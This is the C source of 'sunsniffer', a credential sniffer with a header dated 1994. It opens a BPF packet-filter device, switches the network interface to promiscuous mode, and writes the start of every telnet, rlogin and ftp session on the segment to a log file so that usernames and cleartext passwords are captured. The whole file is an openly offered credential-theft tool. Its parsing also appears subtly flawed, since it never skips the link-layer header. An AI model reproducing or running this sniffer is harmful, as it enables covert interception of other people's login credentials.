/*
 * sunsniffer.c  --  login sniffer.  (c) the management, 1994.
 *
 * Classic shared-Ethernet credential sniffer: open the packet filter in
 * promiscuous mode and log the first ~128 bytes of every telnet(23), rlogin(513)
 * and ftp(21) session -- enough to catch the banner, username and the cleartext
 * password that follows, since none of those protocols encrypt anything.
 *
 *   cc -o sunsniffer sunsniffer.c   &&   ./sunsniffer ed1
 *
 * NB: needs raw packet access AND a shared (hub/coax) segment to see other hosts'
 * traffic.  On a switched or NIT-less box it sees nothing -- read the existing
 * capture log instead.  cf ~/takedown TIMELINE 4001 (dono's cache: solsniff.c,
 * sunsniffer.c, ss.c) and 4015 (the NIT sniffer kernel on CSN).
 */
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/file.h>
#include <sys/time.h>
#include <net/if.h>
#include <net/bpf.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

#define SNAPLEN 200
#define CATCH(p) ((p)==23 || (p)==513 || (p)==21)   /* telnet, rlogin, ftp */

static int open_bpf(const char *ifn)
{
	char dev[16];
	int i, fd = -1;
	struct ifreq ifr;
	u_int dlt = 0;

	for (i = 0; i < 8; i++) {		/* find a free /dev/bpfN */
		sprintf(dev, "/dev/bpf%d", i);
		if ((fd = open(dev, O_RDONLY)) >= 0)
			break;
	}
	if (fd < 0) { perror("open /dev/bpf"); return -1; }
	strncpy(ifr.ifr_name, ifn, sizeof ifr.ifr_name);
	if (ioctl(fd, BIOCSETIF, &ifr) < 0) { perror("BIOCSETIF"); return -1; }
	ioctl(fd, BIOCGDLT, &dlt);
	i = 1; ioctl(fd, BIOCIMMEDIATE, &i);
	i = 1; ioctl(fd, BIOCPROMISC, &i);	/* promiscuous: see the whole segment */
	return fd;
}

int main(int argc, char **argv)
{
	int fd, n;
	u_int blen = 32768;
	char *buf, *p, *ep;
	FILE *out;

	if (argc != 2) { fprintf(stderr, "usage: %s <iface>\n", argv[0]); return 1; }
	if ((fd = open_bpf(argv[1])) < 0) return 1;
	ioctl(fd, BIOCGBLEN, &blen);
	buf = malloc(blen);
	out = fopen("sunsniff.log", "a");
	if (!out) out = stdout;

	for (;;) {
		if ((n = read(fd, buf, blen)) <= 0) continue;
		p = buf; ep = buf + n;
		while (p < ep) {
			struct bpf_hdr *bh = (struct bpf_hdr *)p;
			struct ip *ip = (struct ip *)(p + bh->bh_hdrlen);
			struct tcphdr *th = (struct tcphdr *)((char *)ip + (ip->ip_hl << 2));
			char *data = (char *)th + (th->th_off << 2);
			int dport = ntohs(th->th_dport);
			if (ip->ip_p == IPPROTO_TCP && CATCH(dport) && data < ep) {
				int dl = ep - data; if (dl > SNAPLEN) dl = SNAPLEN;
				fprintf(out, " PATH: %s => :%d\n DATA: %.*s\n",
				    inet_ntoa(ip->ip_src), dport, dl, data);
				fflush(out);
			}
			p += BPF_WORDALIGN(bh->bh_hdrlen + bh->bh_caplen);
		}
	}
	return 0;
}
